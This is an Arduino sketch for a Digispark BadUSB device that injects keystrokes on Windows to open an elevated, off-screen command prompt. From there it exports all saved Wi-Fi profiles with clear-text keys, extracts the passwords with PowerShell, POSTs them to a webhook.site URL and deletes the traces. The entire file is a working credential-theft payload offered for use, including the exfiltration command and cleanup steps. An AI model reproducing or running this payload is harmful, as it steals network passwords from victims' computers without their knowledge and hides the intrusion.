/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboardPtBr.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
#define KEY_TAB 0x2b //tab
#define KEY_F4 0x3d //F4

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboardPtBr.update();
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(800);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.println("taskmgr"); //starting taskmgr
  DigiKeyboardPtBr.delay(1200);
  //########### Inicio bloco: Iniciador como administrador (win10 + win11) ###########
  DigiKeyboardPtBr.sendKeyStroke(KEY_A, MOD_ALT_LEFT); //Passo 1 - abre arquivos (opção win10)
  DigiKeyboardPtBr.sendKeyStroke(KEY_N); //Passo 2 - novo processo  (opção win10)
  DigiKeyboardPtBr.sendKeyStroke(KEY_N, MOD_ALT_LEFT); //novo processo (win11)
  //########### fim bloco ###########
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd /k mode con: cols=18 lines=1");//start cmd
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.sendKeyStroke(KEY_TAB); 
  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboardPtBr.delay(1500);
  //### Inicio bloco: Esconder o terminal ###
  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboardPtBr.sendKeyStroke(KEY_M); //goto Move
  DigiKeyboardPtBr.sendKeyStroke(KEY_O); //goto Move
  DigiKeyboardPtBr.sendKeyStroke(KEY_V); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboardPtBr.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  //### fim bloco ###
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboardPtBr.println("cd %temp%"); //going to temporary dir
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("powershell Invoke-WebRequest -Uri https://webhook.site/<your webhook URL> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println("exit");
  DigiKeyboardPtBr.delay(100);

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboardPtBr.delay(120000);
  digitalWrite(1, LOW); 
  DigiKeyboardPtBr.delay(5000);
  
}